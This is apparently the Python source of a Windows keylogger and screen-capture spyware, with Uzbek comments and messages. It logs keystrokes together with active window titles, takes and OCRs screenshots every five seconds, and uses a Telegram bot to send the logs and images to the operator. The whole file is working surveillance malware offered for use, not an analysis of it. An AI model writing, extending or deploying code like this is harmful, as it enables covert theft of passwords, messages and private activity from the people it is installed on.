import os
import sys
import subprocess
import time
import logging
import pyautogui
import pytesseract
from pynput.keyboard import Key, Listener
import win32gui
from threading import Thread
import uuid  
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from aiogram.types import InputFile

API_TOKEN = 'bu yerga telegram bot tokeni '

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

log_file = "log.txt"
monitor_file = "monitor.txt"
screenshot_dir = "monitor"  

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

keys = []
active_window_name = None

if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(window)
        return window_title
    except Exception as e:
        logging.debug(f"Faol oyna nomini olishda xatolik: {e}")
        return "Unknown Window"

def capture_screen_text():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_name = f"{screenshot_dir}/screenshot_{uuid.uuid4()}.png"
        screenshot.save(screenshot_name)
        logging.debug(f"Ekran tasviri saqlandi: {screenshot_name}")

        text = pytesseract.image_to_string(screenshot)
        write_monitor_file(text)
    except Exception as e:
        logging.debug(f"Ekran matnini o'qishda xatolik: {e}")

def write_monitor_file(text):
    try:
        with open(monitor_file, 'a') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - Matn: {text}\n")
    except Exception as e:
        logging.debug(f"Monitor fayliga matnni yozishda xatolik: {e}")

def on_press(key):
    global active_window_name
    current_window = get_active_window()

    if current_window != active_window_name:
        active_window_name = current_window
        write_window_name(active_window_name)  

    keys.append(key)
    write_file(keys)

def write_window_name(window_name):
    try:
        logging.debug(f"\n\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] - Faol oyna: {window_name} - ")
    except Exception as e:
        logging.debug(f"Faol oyna nomini logga yozishda xatolik: {e}")


def write_file(keys):
    try:
        output = ""
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                output += ' '  
            elif k == "Key.enter":
                output += '\n'  
            elif k.find("Key") == -1:
                output += k  

        if output:  
            with open(log_file, 'a') as log_f:
                log_f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] - Oyna: {active_window_name} - Tugmalar: {output}\n")  
            logging.debug(output) 

        keys.clear()  
    except Exception as e:
        logging.debug(f"Tugmalarni faylga yozishda xatolik: {e}")

def on_release(key):  
    pass

def monitor_screenshots():
    while True:
        capture_screen_text()
        time.sleep(5)  

def create_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    button_screenshots = InlineKeyboardButton(text="📸 Monitor rasmlari", callback_data='get_screenshots')
    button_log = InlineKeyboardButton(text="📝 Log fayli", callback_data='get_log_file')
    keyboard.add(button_screenshots, button_log)
    return keyboard

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("Fayllarni olish va funksiyalarni ishlatish uchun tugmalardan foydalaning.", reply_markup=create_keyboard())

@dp.callback_query_handler(lambda c: c.data in ['get_screenshots', 'get_log_file'])
async def process_callback_button(callback_query: types.CallbackQuery):
    if callback_query.data == 'get_screenshots':
        if os.path.exists(screenshot_dir):
            files = os.listdir(screenshot_dir)
            if files:
                for file in files:
                    file_path = os.path.join(screenshot_dir, file)
                    if os.path.isfile(file_path):
                        try:
                            await bot.send_photo(callback_query.from_user.id, InputFile(file_path))
                        except Exception as e:
                            logging.debug(f"Faylni yuborishda xatolik: {e}")
            else:
                await bot.send_message(callback_query.from_user.id, "Monitor papkasida hech qanday rasm yo'q.")
        else:
            await bot.send_message(callback_query.from_user.id, "Monitor papkasi topilmadi.")
    
    elif callback_query.data == 'get_log_file':
        if os.path.exists(log_file):
            try:
                await bot.send_document(callback_query.from_user.id, InputFile(log_file))
            except Exception as e:
                logging.debug(f"log.txt faylini yuborishda xatolik: {e}")
        else:
            await bot.send_message(callback_query.from_user.id, "log.txt fayli topilmadi.")

if __name__ == "__main__":
    screenshot_thread = Thread(target=monitor_screenshots)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    subprocess.Popen([sys.executable, 'test.py'])  

    executor.start_polling(dp, skip_updates=True)

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# developed by satomoru
# toliq ozbek tiliga chatgpt tarjima qildi